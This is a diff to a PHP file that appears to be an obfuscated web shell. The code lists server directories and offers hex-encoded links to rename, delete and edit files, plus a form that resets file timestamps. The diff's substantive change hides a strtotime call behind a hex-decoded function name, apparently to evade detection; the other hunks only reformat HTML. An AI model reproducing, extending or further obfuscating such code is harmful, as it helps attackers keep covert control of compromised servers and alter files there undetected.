@@ -193,7 +193,8 @@
 										'.$d_.'
 								'.$c_;
 					if( !empty($_POST["t"]) ) {
-						$p = strtotime($_POST["t"]);
+						$_33 = uhex('737472746f74696d65');
+						$p = $_33($_POST["t"]);
 						if($p) {
 							if(!$_25(uhex($_GET["t"]),$p,$p)) {
 								$__($y_);
@@ -257,7 +258,7 @@
 						echo $a_.'+FILE'.$b_.'
 									<form action="" method="post">
 										<input name="n" class="x" type="text" value="">
-									'.$d_.'
+										'.$d_.'
 								'.$c_;
 					if(isset($_POST["n"])) {
 						if(!$_25($_POST["n"])) {
@@ -357,7 +358,8 @@
 								($_8("$d/$c")) ?
 								$h .= '<tr class="r">
 							<td>
-								<i class="far fa-folder m"></i> <a href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
+								<i class="far fa-folder m"></i> 
+								<a href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
 							</td>
 							<td class="x">
 								dir
@@ -369,14 +371,16 @@
 								<a href="?d='.hex($e).'&t='.hex($c).'">'.$_20("Y-m-d H:i", $_21("$d/$c")).'</a>
 							</td>
 							<td class="x">
-								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> <a href="?d='.hex($e).'&x='.hex($c).'">D</a>
+								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> 
+								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
 							</td>
 						</tr>
 						'
 							:
 								$j .= '<tr class="r">
 							<td>
-								<i class="far fa-file m"></i>&thinsp; <a href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
+								<i class="far fa-file m"></i>&thinsp; 
+								<a href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
 							</td>
 							<td class="x">
 								'.$s.'
@@ -388,7 +392,9 @@
 								<a href="?d='.hex($e).'&t='.hex($c).'">'.$_20("Y-m-d H:i", $_21("$d/$c")).'</a>
 							</td>
 							<td class="x">
-								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> <a href="?d='.hex($e).'&x='.hex($c).'">D</a> <a href="?d='.hex($e).'&e='.hex($c).'">E</a>'.$zi.'
+								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> 
+								<a href="?d='.hex($e).'&x='.hex($c).'">D</a> 
+								<a href="?d='.hex($e).'&e='.hex($c).'">E</a>'.$zi.'
 							</td>
 						</tr>
 						';
